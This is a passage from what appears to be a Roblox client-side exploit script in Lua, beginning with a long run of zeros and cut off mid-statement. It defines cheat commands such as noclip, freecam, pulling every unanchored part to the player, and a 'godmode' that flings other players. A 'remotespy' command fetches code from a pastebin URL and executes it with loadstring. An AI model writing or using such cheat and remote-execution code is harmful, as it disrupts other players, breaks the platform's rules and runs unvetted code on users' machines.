00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,9990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
 end
 wait(.3)
 player.Torso.Anchored = false
 while wait(.3) do
  if handle:FindFirstChild("BP",true) then
  handle.CanCollide = false
  end
  BP.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,y,0)
     wait(.3)
  if handle:FindFirstChild("BP",true) then
     handle.CanCollide = false
  end
      BP.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,y2,0)
   end
  end
    end
 end)
end
end)

cmd.add({"bringunanchored"}, {"bringunanchored", "brings every unanchored part on the map"}, function()
	for _,v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") and v.Anchored==false then
		v.CFrame=game:GetService("Players").LocalPlayer.Character.Head.CFrame
		end
		end
end)

cmd.add({"spin"}, {"spin <number>", "spins your character"}, function()

end)

cmd.add({"noclip", "nclip", "nc"}, {"noclip", "Disable your player's collision"}, function()
	if connections["noclip"] then lib.disconnect("noclip") return end
	lib.connect("noclip", RunService.Stepped:Connect(function()
		if not character then return end
		for i, v in pairs(character:GetDescendants()) do
			if v:IsA("BasePart") then
				v.CanCollide = false
			end
		end
	end))
end)
cmd.add({"clip", "c"}, {"clip", "Enable your player's collision"}, function()
	lib.disconnect("noclip")
end)

cmd.add({"freecam", "fc", "fcam"}, {"freecam [speed]", "Enable free camera"}, function(speed)
	if not speed then speed = 5 end
	if connections["freecam"] then lib.disconnect("freecam") camera.CameraSubject = character 	wrap(function() character.PrimaryPart.Anchored = false end) end
	local dir = {w = false, a = false, s = false, d = false}
	local cf = Instance.new("CFrameValue")
	local camPart = Instance.new("Part")
	camPart.Transparency = 1
	camPart.Anchored = true
	camPart.CFrame = camera.CFrame
	wrap(function()
		character.PrimaryPart.Anchored = true
	end)
	
	lib.connect("freecam", RunService.RenderStepped:Connect(function()
		local primaryPart = camPart
		camera.CameraSubject = primaryPart
		
		local x, y, z = 0, 0, 0
		if dir.w then z = -1 * speed end
		if dir.a then x = -1 * speed end
		if dir.s then z = 1 * speed end
		if dir.d then x = 1 * speed end
		if dir.q then y = 1 * speed end
		if dir.e then y = -1 * speed end
		
		primaryPart.CFrame = CFrame.new(
			primaryPart.CFrame.p,
			(camera.CFrame * CFrame.new(0, 0, -100)).p
		)
		
		local moveDir = CFrame.new(x,y,z)
		cf.Value = cf.Value:lerp(moveDir, 0.2)
		primaryPart.CFrame = primaryPart.CFrame:lerp(primaryPart.CFrame * cf.Value, 0.2)
	end))
	lib.connect("freecam", UserInputService.InputBegan:Connect(function(input, event)
		if event then return end
		local code, codes = input.KeyCode, Enum.KeyCode
		if code == codes.W then
			dir.w = true
		elseif code == codes.A then
			dir.a = true
		elseif code == codes.S then
			dir.s = true
		elseif code == codes.D then
			dir.d = true
		elseif code == codes.Q then
			dir.q = true
		elseif code == codes.E then
			dir.e = true
		elseif code == codes.Space then
			dir.q = true
		end
	end))
	lib.connect("freecam", UserInputService.InputEnded:Connect(function(input, event)
		if event then return end
		local code, codes = input.KeyCode, Enum.KeyCode
		if code == codes.W then
			dir.w = false
		elseif code == codes.A then
			dir.a = false
		elseif code == codes.S then
			dir.s = false
		elseif code == codes.D then
			dir.d = false
		elseif code == codes.Q then
			dir.q = false
		elseif code == codes.E then
			dir.e = false
		elseif code == codes.Space then
			dir.q = false
		end
	end))
end)
cmd.add({"unfreecam", "unfc", "unfcam"}, {"unfreecam", "Disable free camera"}, function()
	lib.disconnect("freecam")
	camera.CameraSubject = character
	wrap(function()
		character.PrimaryPart.Anchored = false
	end)
end)

cmd.add({"drophats"}, {"drophats", "Drop all of your hats"}, function()
	for _, hat in pairs(character:GetChildren()) do
		if hat:IsA("Accoutrement") then
			hat.Parent = workspace
		end
	end
end)

cmd.add({"hatspin"}, {"hatspin <height>", "Make your hats spin"}, function(h)
	local head = character:FindFirstChild("Head")
	if not head then return end
	for _, hat in pairs(character:GetChildren()) do
		if hat:IsA("Accoutrement") and hat:FindFirstChild("Handle") then
			local handle = hat.Handle
			handle:BreakJoints()
			
			local align = Instance.new("AlignPosition")
			local a0, a1 = Instance.new("Attachment"), Instance.new("Attachment")
			align.Attachment0, align.Attachment1 = a0, a1
			align.RigidityEnabled = true
			a1.Position = Vector3.new(0, tonumber(h) or 0.5, 0)
			lock(align, handle); lock(a0, handle); lock(a1, head);
			
			local angular = Instance.new("BodyAngularVelocity")
			angular.AngularVelocity = Vector3.new(0, math.random(100, 160)/16, 0)
			angular.MaxTorque = Vector3.new(0, 400000, 0)
			lock(angular, handle);
		end
	end
end)

cmd.add({"hatorbit"}, {"hatorbit [height] [distance]", "Make your hats orbit around your head"}, function(h, d)
	local head = character:FindFirstChild("Head")
	if not head then return end
	local i = 3
	for _, hat in pairs(character:GetChildren()) do
		if hat:IsA("Accoutrement") and hat:FindFirstChild("Handle") then
			local handle = hat.Handle
			handle:BreakJoints()
			
			local align = Instance.new("AlignPosition")
			local a0, a1 = Instance.new("Attachment"), Instance.new("Attachment")
			align.Attachment0, align.Attachment1 = a0, a1
			align.RigidityEnabled = true
			lock(align, handle); lock(a0, handle); lock(a1, head);
			i = i + 0.5
			local n = tonumber(d) or i
			wrap(function()
				local rotX, rotY = 0, math.pi/2
				local speed = math.random(25, 100)/1000
				while handle and handle.Parent do
					rotX, rotY = rotX + speed, rotY + speed
					a1.Position = Vector3.new(math.sin(rotX) * (n), tonumber(h) or 0, math.sin(rotY) * (n))
					RunService.RenderStepped:Wait(0)
				end
			end)
		end
	end
end)

cmd.add({"limbbounce"}, {"limbbounce [height] [distance]", "Make your limbs bounce around your head"}, function(h, d)
	local head = character:FindFirstChild("Head")
	if not head then return end
	local i = 2
	for _, part in pairs(character:GetDescendants()) do
		local name = part.Name:lower()
		if part:IsA("BasePart") and not part.Parent:IsA("Accoutrement") and not name:find("torso") and not name:find("head") and not name:find("root") then
			i = i + math.random(15,50)/100
			part:BreakJoints()
			local n = tonumber(d) or i
			
			local align = Instance.new("AlignPosition")
			local a0, a1 = Instance.new("Attachment"), Instance.new("Attachment")
			align.Attachment0, align.Attachment1 = a0, a1
			align.RigidityEnabled = true
			lock(align, part); lock(a0, part); lock(a1, head);
			
			wrap(function()
				local rotX = 0
				local speed = math.random(350, 750)/10000
				while part and part.Parent do
					rotX = rotX + speed
					a1.Position = Vector3.new(0, (tonumber(h) or 0) + math.sin(rotX) * n, 0)
					RunService.RenderStepped:Wait(0)
				end
			end)
		end
	end
end)

cmd.add({"limborbit"}, {"limborbit [height] [distance]", "Make your limbs orbit around your head"}, function(h, d)
	local head = character:FindFirstChild("Head")
	if not head then return end
	local i = 2
	for _, part in pairs(character:GetDescendants()) do
		local name = part.Name:lower()
		if part:IsA("BasePart") and not part.Parent:IsA("Accoutrement") and not name:find("torso") and not name:find("head") and not name:find("root") then
			i = i + math.random(15,50)/100
			part:BreakJoints()
			local n = tonumber(d) or i
			
			local align = Instance.new("AlignPosition")
			local a0, a1 = Instance.new("Attachment"), Instance.new("Attachment")
			align.Attachment0, align.Attachment1 = a0, a1
			align.RigidityEnabled = true
			lock(align, part); lock(a0, part); lock(a1, head);
			
			wrap(function()
				local rotX, rotY = 0, math.pi/2
				local speed = math.random(35, 75)/1000
				while part and part.Parent do
					rotX, rotY = rotX + speed, rotY + speed
					a1.Position = Vector3.new(math.sin(rotX) * (n), tonumber(h) or 0, math.sin(rotY) * (n))
					RunService.RenderStepped:Wait(0)
				end
			end)
		end
	end
end)

local function getAllTools()
	local tools = {}
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	if backpack then
		for i, v in pairs(backpack:GetChildren()) do
			if v:IsA("Tool") then
				table.insert(tools, v)
			end
		end
	end
	for i, v in pairs(character:GetChildren()) do
		if v:IsA("Tool") then
			table.insert(tools, v)
		end
	end
	return tools
end

cmd.add({"ununanchoredfollow"}, {"ununanchoredfollow", "un does the unanchorfollow thing lol"}, function(h, d)
lib.disconnect("unanchoredfollow")
end)

cmd.add({"remotespy"}, {"remotespy", "executes remotespy"}, function()
	loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
	end)

cmd.add({"circlemath", "cm"}, {"circlemath <mode> <size>", "Gay circle math\nModes: abc..."}, function(mode, size)
	local mode = mode or "a"
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	lib.disconnect("cm")
	if backpack and character.Parent then
		local tools = getAllTools()
		for i, tool in pairs(tools) do
			local cpos, g = (math.pi*2)*(i/#tools), CFrame.new()
			local tcon = {}
			tool.Parent = backpack
			
			if mode == "a" then
				size = tonumber(size) or 2
				g = (
					CFrame.new(0, 0, size)*
					CFrame.Angles(rad(90), 0, cpos)
				)
			elseif mode == "b" then
				size = tonumber(size) or 2
				g = (
					CFrame.new(i - #tools/2, 0, 0)*
					CFrame.Angles(rad(90), 0, 0)
				)
			elseif mode == "c" then
				size = tonumber(size) or 2
				g = (
					CFrame.new(cpos/3, 0, 0)*
					CFrame.Angles(rad(90), 0, cpos*2)
				)
			elseif mode == "d" then
				size = tonumber(size) or 2
				g = (
					CFrame.new(clamp(tan(cpos), -3, 3), 0, 0)*
					CFrame.Angles(rad(90), 0, cpos)
				)
			elseif mode == "e" then
				size = tonumber(size) or 2
				g = (
					CFrame.new(0, 0, clamp(tan(cpos), -5, 5))*
					CFrame.Angles(rad(90), 0, cpos)
				)
			end
			tool.Grip = g
			tool.Parent = character
			
			tcon[#tcon] = lib.connect("cm", mouse.Button1Down:Connect(function()
				tool:Activate()
			end))
			tcon[#tcon] = lib.connect("cm", tool.Changed:Connect(function(p)
				if p == "Grip" and tool.Grip ~= g then
					tool.Grip = g
				end
			end))
			
			lib.connect("cm", tool.AncestryChanged:Connect(function()
				for i = 1, #tcon do
					tcon[i]:Disconnect()
				end
			end))
		end
	end
end)

local r = math.rad
local center = CFrame.new(1.5, 0.5, -1.5)

cmd.add({"toolanimate"}, {"toolanimate <mode> <int>", "Make your tools epic\nModes: ufo/ring/shutter/saturn/portal/wtf/ball/tor"}, function(mode, int)
	lib.disconnect("tooldance")
	local int = tonumber(int) or 5
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local primary = character:FindFirstChild("HumanoidRootPart")
	if backpack and primary then
		local tools = getAllTools()
		for i, tool in pairs(tools) do
			if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
				local circ = (i/#tools)*(math.pi*2)
				
				local function editGrip(tool, cframe, offset)
					local origin = CFrame.new(cframe.p):inverse()
					local x, y, z = cframe:toEulerAnglesXYZ()
					local new = CFrame.Angles(x, y, z)
					local grip = (origin * new):inverse()
					tool.Parent = backpack
					tool.Grip = offset * grip
					tool.Parent = character
					
					for i, v in pairs(tool:GetDescendants()) do
						if v:IsA("Sound") then
							v:Stop()
						end
					end
				end
				tool.Handle.Massless = true
				
				if mode == "ufo" then
					local s = {}
					local x, y = i, i + math.pi / 2
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + 0.1, y + 0.1
						
						local cframe =
							center *
							CFrame.new() *
							CFrame.Angles(r(s.y*10), circ + r(s.y*8), r(s.x*10))
						local offset =
							CFrame.new(int, 0, 0) *
							CFrame.Angles(0, 0, 0)
						editGrip(tool, cframe, offset)
					end))
				elseif mode == "ring" then
					local s = {}
					local x, y = i, i + math.pi / 2
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + 0.04, y + 0.04
						
						local cframe =
							center *
							CFrame.new(0, 3, 0) *
							CFrame.Angles(0, circ, x)
						local offset =
							CFrame.new(0, 0, int) *
							CFrame.Angles(0, 0, 0)
						editGrip(tool, cframe, offset)
					end))
				elseif mode == "shutter" then
					local s = {}
					local x, y = 0, math.pi / 2
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + 0.1, y + 0.1
						
						local cframe =
							center *
							CFrame.new(0, 0, 0) *
							CFrame.Angles(0, 0, circ + 0)
						local offset =
							CFrame.new(s.y*6, 0, int) *
							CFrame.Angles(r(-90), 0, 0)
						editGrip(tool, cframe, offset)
					end))
				elseif mode == "saturn" then
					local s = {}
					local x, y = 0, math.pi / 2
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + 0.1, y + 0.1
						local cframe =
							center *
							CFrame.new(0, 0, 0) *
							CFrame.Angles(0, circ, 0)
						local offset =
							CFrame.new(s.y*6, 0, int) *
							CFrame.Angles(0, 0, r(0))
						editGrip(tool, cframe, offset)
					end))
				elseif mode == "portal" then
					local s = {}
					local x, y = 0, math.pi / 2
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + 0.1, y + 0.1
						
						local cframe =
							center *
							CFrame.new(0, 0, 0) *
							CFrame.Angles(0, 0, circ + r(x*45))
						local offset =
							CFrame.new(3, 0, int) *
							CFrame.Angles(r(-90), 0, 0)
						editGrip(tool, cframe, offset)
					end))
				elseif mode == "ball" then
					local s = {}
					local n = math.random()*#tools
					local x, y = n, n+math.pi / 2
					local random = math.random()
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + 0.1, y + 0.1
						local cframe =
							center *
							CFrame.new(0, 0, 0) *
							CFrame.Angles(r(y*25), circ, r(y*25))
						local offset =
							CFrame.new(0, int + random*2, 0) *
							CFrame.Angles(r(x*15), 0, 0)
						editGrip(tool, cframe, offset)
					end))
				elseif mode == "wtf" then
					local s = {}
					local x, y = math.random()^3, math.random()^3+math.pi / 2
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + 0.1 + math.random()/10, y + 0.1 + math.random()/10
						local cframe =
							center *
							CFrame.new(0, 0, 0) *
							CFrame.Angles(r(y*100)+math.random(), circ, r(y*100)+math.random())
						local offset =
							CFrame.new(0, int + math.random()*4, 0) *
							CFrame.Angles(r(x*100), 0, 0)
						editGrip(tool, cframe, offset)
					end))
				elseif mode == "tor" then
					local s = {}
					local x, y = i*1, i*1+math.pi / 2
					local random = math.random()
					lib.connect("tooldance", RunService.Heartbeat:Connect(function()
						s.x = math.sin(x)
						s.y = math.sin(y)
						x, y = x + (int/75), y+0.1
						local cframe =
							center *
							CFrame.new(1.5, 2, 0) *
							CFrame.Angles(r(-90-25), 0, 0)
						local offset =
							CFrame.new(0, s.x*3, -int+math.sin(y/5)*-int) *
							CFrame.Angles(r(int), s.x, -x)
						editGrip(tool, cframe, offset)
					end))
				end
			else
				table.remove(tools, i)
			end
		end
	end
end)

cmd.add({"tooldance", "td"}, {"tooldance <mode> <size>", "Make your tools dance\nModes: tor/sph/inf/rng/whl/wht/voi"}, function(mode, size)
	local size = tonumber(size) or 5
	lib.disconnect("tooldance")
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local primary = character:FindFirstChild("HumanoidRootPart")
	if backpack and primary then
		local i, tools = 0, getAllTools()
		for _, tool in pairs(tools) do
			if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
				i=i+1
				tool.Parent = character
				local n = i
				local grip = character:FindFirstChild("RightGrip", true)
				local arm = grip.Parent
				
				local function editGrip(cf)
					tool.Parent = backpack
					tool.Grip = cf
					tool.Parent = character
					
					for i, v in pairs(tool:GetDescendants()) do
						if v:IsA("Sound") and v.Name:find("sheath") then
							v:Destroy()
						end
					end
				end
				tool.Handle.Massless = true
				
				if mode == "tor" then
					local x, y = n, n+math.pi/2
					lib.connect("tooldance", RunService.RenderStepped:Connect(function()
						x,y = x+(size/75),y+0.1
						local sx,sy = math.sin(x),math.sin(y)
						editGrip(
							CFrame.new(
								Vector3.new(0, math.sin(x * 0.5), size + 3 + math.sin(y / 5) * size)
							) * 
							CFrame.Angles(
								math.rad(size), 
								math.sin(x), 
								-x
							)
						)
					end))
				elseif mode == "sph" then
					local x, y = n, n+math.pi/2
					lib.connect("tooldance", RunService.RenderStepped:Connect(function()
						x,y = x+.1,y+.1
						local sx,sy = math.sin(x),math.sin(y)
						editGrip(
							CFrame.new(
								Vector3.new(0, size, 0)
							) * 
							CFrame.Angles(
								math.deg(x/150), 
								x + rad(90), 
								0
							)
						)
					end))
				elseif mode == "inf" then
					local x, y = n, n+math.pi/2
					lib.connect("tooldance", RunService.RenderStepped:Connect(function()
						x,y = x+.1,y+.1
						local sx,sy = math.sin(x),math.sin(y)
						editGrip(
							CFrame.new(
								Vector3.new(0, size, 0)
							) * 
							CFrame.Angles(
								x, 
								x + rad(90), 
								0
							)
						)
					end))
				elseif mode == "wht" then
					local x, y = n, n+math.pi/2
					lib.connect("tooldance", RunService.RenderStepped:Connect(function()
						x,y = x+.1,y+.1
						local sx,sy = math.sin(x),math.sin(y)
						editGrip(
							CFrame.new(
								Vector3.new(0, size, 0)
							) * 
							CFrame.Angles(
								(y+math.sin(x)*10)/10, 
								x + rad(90), 
								0
							)
						)
					end))
				elseif mode == "rng" then
					local x, y = n, n+math.pi/2
					lib.connect("tooldance", RunService.RenderStepped:Connect(function()
						x,y = x+0.1,y+0.1
						local sx,sy = math.sin(x),math.sin(y)
						editGrip(
							CFrame.new(
								0, 0, size
							) * 
							CFrame.Angles(
								0, 
								x, 
								0
							)
						)
					end))
				elseif mode == "whl" then
					local x, y = n, n+math.pi/2
					lib.connect("tooldance", RunService.RenderStepped:Connect(function()
						x,y = x+0.1,y+0.1
						local sx,sy = math.sin(x),math.sin(y)
						editGrip(
							CFrame.new(
								Vector3.new(0, 0, size)
							) * 
							CFrame.Angles(
								x,
								0, 
								0
							)
						)
					end))
				elseif mode == "voi" then
					local x, y = n, n+math.pi/2
					lib.connect("tooldance", RunService.RenderStepped:Connect(function()
						x,y = x+0.1,y+0.1
						local sx,sy = math.sin(x),math.sin(y)
						editGrip(
							CFrame.new(
								Vector3.new(size, 0, 0)
							) * 
							CFrame.Angles(
								0,
								.6 + sy/3, 
								(n) + sx + x
							)
						)
					end))
				end
			end
		end
	end
end)
cmd.add({"nodance", "untooldance"}, {"nodance", "Stop making tools dance"}, function()
	lib.disconnect("tooldance")
end)

cmd.add({"toolvis", "audiovis"}, {"toolvis <size>", "Turn your tools into an audio visualizer"}, function(size)
	lib.disconnect("tooldance")
	local backpack = localPlayer:FindFirstChildWhichIsA("Backpack")
	local primary = character:FindFirstChild("HumanoidRootPart")
	local hum = character:FindFirstChild("Humanoid")
	local sound
	for i, v in pairs(character:GetDescendants()) do
		if v:IsA("Sound") and v.Playing then
			sound = v
		end
	end
	if backpack and primary and sound then
		local tools = getAllTools()
		local t = 0
		for i, tool in pairs(tools) do
			if tool.Parent == character and tool:IsA("BackpackItem") and tool:FindFirstChildWhichIsA("BasePart") and tool.Parent == character then
				local grip = character:FindFirstChild("RightGrip", true)
				local oldParent = grip.Parent
				lib.connect("tooldance", RunService.RenderStepped:Connect(function()
					if not sound then lib.disconnect("tooldance") end
					tool.Parent = character
					grip.Parent = oldParent
				end))
			end
		end
		wait()
		for i, tool in pairs(tools) do
			if tool.Parent == backpack and tool:IsA("BackpackItem") and tool:FindFirstChildWhichIsA("BasePart") then
				t = t + 1
				tool.Parent = character
				local n = i
				local grip = character:FindFirstChild("RightGrip", true)
				local arm = grip.Parent
				
				local function editGrip(cf)
					tool.Parent = backpack
					tool.Grip = tool.Grip:lerp(cf, 0.2)
					tool.Parent = character
					for i, v in pairs(tool:GetDescendants()) do
						if v:IsA("Sound") then
							v.Parent = nil
						end
					end
				end
				tool.Handle.Massless = true
				
				local x,y,z,a = n,n+math.pi/2,n,0
				lib.connect("tooldance", RunService.Heartbeat:Connect(function()
					if not sound then lib.disconnect("tooldance") end
					
					local mt, loudness = sound.PlaybackLoudness/100, sound.PlaybackLoudness
					local sx, sy, sz, sa = math.sin(x), math.sin(y), math.sin(z), math.sin(a)
					x,y,z,a = x + 0.22 + mt / 100,  y + sx + mt,  z + sx/10,  a + mt/100 + math.sin(x-n)/100
					editGrip(
						CFrame.new(
							Vector3.new(
								0,
								2 + ((sx/2) * (mt^3/15))/3 - ((sx+0.5)/1.5 * ((loudness/10)^2/400)),
								tonumber(size) or 7
							)
						) * 
						CFrame.Angles(
							math.rad((sz+1)/2)*5,
							((math.pi*2)*(n/t)) - (a), 
							math.rad(sx)*5
						)
					)
				end))
			end
		end
	end
end)

cmd.add({"toolspin"}, {"toolspin [height] [amount]", "Make your tools spin on your head"}, function(h, amt)
	if not amt then amt = 1000 end
	local head = character:FindFirstChild("Head")
	if not head then return end
	for i, tool in pairs(localPlayer.Backpack:GetChildren()) do
		if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
			if i >= (tonumber(amt) or 1000) then break end
			if tool:FindFirstChildWhichIsA("LocalScript") then
				tool:FindFirstChildWhichIsA("LocalScript").Disabled = true
			end
			tool.Parent = character
		end
	end
	wait(0.5)
	for _, tool in pairs(character:GetChildren()) do
		if tool:IsA("Tool") then
			wrap(function()
				tool:WaitForChild("Handle")
				for i, part in pairs(tool:GetDescendants()) do
					if part:IsA("BasePart") then
						part:BreakJoints()
						
						local align = Instance.new("AlignPosition")
						local a0, a1 = Instance.new("Attachment"), Instance.new("Attachment")
						align.Attachment0, align.Attachment1 = a0, a1
						align.RigidityEnabled = true
						a1.Position = Vector3.new(0, tonumber(h) or 0, 0)
						lock(align, part); lock(a0, part); lock(a1, head);
						
						local angular = Instance.new("BodyAngularVelocity")
						angular.AngularVelocity = Vector3.new(0, math.random(100, 160)/16, 0)
						angular.MaxTorque = Vector3.new(0, 400000, 0)
						lock(angular, part);
						
						spawn(function()
							repeat wait() until tool.Parent ~= character
							angular:Destroy()
							align:Destroy()
						end)
					end
				end
			end)
		end
	end
end)

cmd.add({"toolorbit"}, {"toolorbit [height] [distance] [amount]", "Make your tools orbit around your head"}, function(h, d, amt)
	if not amt then amt = 1000 end
	local head = character:FindFirstChild("Head")
	if not head then return end
	for i, tool in pairs(localPlayer.Backpack:GetChildren()) do
		if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
			if i >= (tonumber(amt) or 1000) then break end
			if tool:FindFirstChildWhichIsA("LocalScript") then
				tool:FindFirstChildWhichIsA("LocalScript").Disabled = true
			end
			tool.Parent = character
		end
	end
	wait(0.5)
	for _, tool in pairs(character:GetChildren()) do
		if tool:IsA("Tool") then
			wrap(function()
				tool:WaitForChild("Handle")
				for i, part in pairs(tool:GetDescendants()) do
					if part:IsA("BasePart") then
						part:BreakJoints()
						
						local align = Instance.new("AlignPosition")
						local a0, a1 = Instance.new("Attachment"), Instance.new("Attachment")
						align.Attachment0, align.Attachment1 = a0, a1
						align.RigidityEnabled = true
						lock(align, part); lock(a0, part); lock(a1, head);
						wrap(function()
							local rotX, rotY = 0, math.pi/2
							local speed = math.random(25, 100)/1000
							local n = tonumber(d) or math.random(300, 700)/100
							local y = tonumber(h) or math.random(-100, 100)/100/2
							rotY, rotX = rotY + n, rotX + n
							
							part.CollisionGroupId = math.random(1000000,9999999)
							part.Anchored = false
							part.CFrame = head.CFrame * CFrame.new(0, 3, 0)
							
							while part and part.Parent and tool.Parent == character do
								rotX, rotY = rotX + speed, rotY + speed
								a1.Position = Vector3.new(math.sin(rotX) * n, y, math.sin(rotY) * n)
								RunService.RenderStepped:Wait(0)
							end
						end)
					end
				end
			end)
		end
	end
end)

cmd.add({"blockhats"}, {"blockhats", "Remove the meshes in your hats"}, function()
	for _, hat in pairs(character:GetChildren()) do
		if hat:IsA("Accoutrement") and hat:FindFirstChild("Handle") then
			local handle = hat.Handle
			if handle:FindFirstChildWhichIsA("SpecialMesh") then
				handle:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
			end
		end
	end
end)

cmd.add({"blocktools"}, {"blocktools", "Remove the meshes in your tools"}, function()
	for _, tool in pairs(character:GetChildren()) do
		if tool:IsA("Tool") then
			for _, mesh in pairs(tool:GetDescendants()) do
				if mesh:IsA("DataModelMesh") then
					mesh:Destroy()
				end
			end
		end
	end
end)

cmd.add({"nomeshes", "nomesh", "blocks"}, {"nomeshes", "Remove all character meshes"}, function()
	for _, mesh in pairs(character:GetDescendants()) do
		if mesh:IsA("DataModelMesh") then
			mesh:Destroy()
		end
	end
end)

cmd.add({"nodecals", "nodecal", "notextures"}, {"nodecals", "Remove all character images"}, function()
	for _, img in pairs(character:GetDescendants()) do
		if img:IsA("Decal") or img:IsA("Texture") then
			img:Destroy()
		end
	end
end)

cmd.add({"godmode"}, {"godmode", "Fling anyone that touches you using angular velocity"}, function()
	lib.disconnect("pfling")
	local char = player.Character
	local hum = char:FindFirstChildWhichIsA("Humanoid")
	
	if char then
		local cf = char.HumanoidRootPart.CFrame
		local bv = Instance.new("BodyAngularVelocity", char.HumanoidRootPart)
		bv.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
		bv.P = math.huge
		bv.AngularVelocity = Vector3.new(0, 9e5, 0)
		bv.Name = "hum"
		lock(bv)
		
		wait()
		char.HumanoidRootPart.CFrame = cf
		char.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		
		for i,v in pairs(char:GetDescendants()) do
			if v:IsA('BasePart') then
				v.Massless = true
				v.Velocity = Vector3.new(0, 0, 0)
			end
		end
		
		local c = lib.connect("pfling", game:GetService('RunService').Stepped:Connect(function()
			for i,v in pairs(char:GetDescendants()) do
				if v:IsA('BasePart') then
					v.CanCollide = false
				end
			end
		end))
		repeat
			wait()
		until
